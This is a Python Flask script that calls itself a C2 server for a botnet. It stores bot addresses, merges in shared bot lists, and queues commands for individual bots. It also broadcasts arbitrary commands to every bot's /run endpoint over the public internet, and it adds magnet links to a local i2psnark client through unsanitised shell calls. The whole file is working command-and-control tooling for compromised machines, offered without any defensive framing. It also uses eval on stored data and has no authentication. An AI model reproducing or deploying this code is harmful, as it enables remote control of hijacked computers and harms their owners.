from flask import Flask, request, jsonify
import os
import threading
import time
import random
import requests

app = Flask(__name__)
SHARED_DIR = "shared_bots"
MAGNET_FILE = "magnet_links.txt"
BOT_LIST = "bots.txt"
COMMAND_FILE = "commands.json"

os.makedirs(SHARED_DIR, exist_ok=True)
open(BOT_LIST, "a").close()
open(COMMAND_FILE, "a").write("{}")

# === Load bots from local + shared ===
def load_all_bots():
    bots = set()
    if os.path.exists(BOT_LIST):
        with open(BOT_LIST) as f:
            bots.update(line.strip() for line in f if line.strip())

    for fname in os.listdir(SHARED_DIR):
        with open(os.path.join(SHARED_DIR, fname)) as f:
            bots.update(line.strip() for line in f if line.strip())

    return list(bots)

# === Update i2psnark with magnet links ===
def start_i2p_torrents():
    if not os.path.exists(MAGNET_FILE):
        return
    with open(MAGNET_FILE) as f:
        for line in f:
            magnet = line.strip()
            if magnet:
                os.system(f"curl -s -X POST http://127.0.0.1:7657/i2psnark/ -d 'action=Add+Torrent&magnet={magnet}'")

# === Periodically merge shared bots into local bots.txt ===
def sync_shared_bots():
    while True:
        all_bots = load_all_bots()
        with open(BOT_LIST, "w") as f:
            for bot in sorted(set(all_bots)):
                f.write(bot + "\n")
        time.sleep(60)

# === Serve commands for bots ===
@app.route("/getcmd/<botid>")
def get_cmd(botid):
    try:
        with open(COMMAND_FILE, "r") as f:
            cmds = eval(f.read())
        return cmds.get(botid, "")
    except:
        return ""

# === Manual command dispatcher ===
@app.route("/sendcmd", methods=["POST"])
def send_cmd():
    data = request.json
    botid = data.get("botid")
    cmd = data.get("cmd")
    if not botid or not cmd:
        return jsonify({"error": "Missing botid or cmd"}), 400

    with open(COMMAND_FILE, "r") as f:
        cmds = eval(f.read())

    cmds[botid] = cmd

    with open(COMMAND_FILE, "w") as f:
        f.write(str(cmds))

    return jsonify({"status": "Command queued"})

# === Broadcast command to all bots on public internet ===
@app.route("/broadcast", methods=["POST"])
def broadcast_cmd():
    cmd = request.json.get("cmd")
    if not cmd:
        return jsonify({"error": "Missing cmd"}), 400

    bots = load_all_bots()
    for bot in bots:
        try:
            requests.post(f"http://{bot}/run", json={"cmd": cmd}, timeout=2)
        except:
            pass

    return jsonify({"status": f"Sent to {len(bots)} bots"})

# === Run Flask ===
def run_server():
    app.run(host="0.0.0.0", port=8080)

if __name__ == "__main__":
    print("[*] Starting i2psnark torrents...")
    start_i2p_torrents()
    print("[*] Launching sync thread...")
    threading.Thread(target=sync_shared_bots, daemon=True).start()
    print("[*] Running Flask C2 server...")
    run_server()
